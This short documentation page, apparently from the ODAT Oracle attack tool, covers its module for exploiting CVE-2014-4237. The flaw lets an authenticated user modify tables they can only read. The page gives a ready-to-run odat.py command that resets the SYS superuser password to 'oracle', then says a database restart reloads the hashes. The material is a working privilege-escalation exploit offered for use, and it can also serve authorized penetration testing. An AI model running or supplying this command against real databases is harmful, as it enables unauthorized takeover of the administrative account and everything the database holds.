# Exploit some _local_ CVE

This module can be used to exploit these following CVE:
* [CVE-2014-4237](https://twitter.com/gokhanatil/status/595853921479991297): A user authenticated can modify all tables who can select even if he has not the privilege to modify them normally (no ALTER privilege).

For example, the following command can be used to set the SYS's password:
```bash
./odat.py  cve  -s $HOST -d $SID -U $LOGIN -P $PASSWORD --set-pwd-2014-4237 'SYS' 'oracle' 
```
With this command, the SYS's password is 'oracle' now. The __database must be restarted__ in order to the __database reloads__ hashes!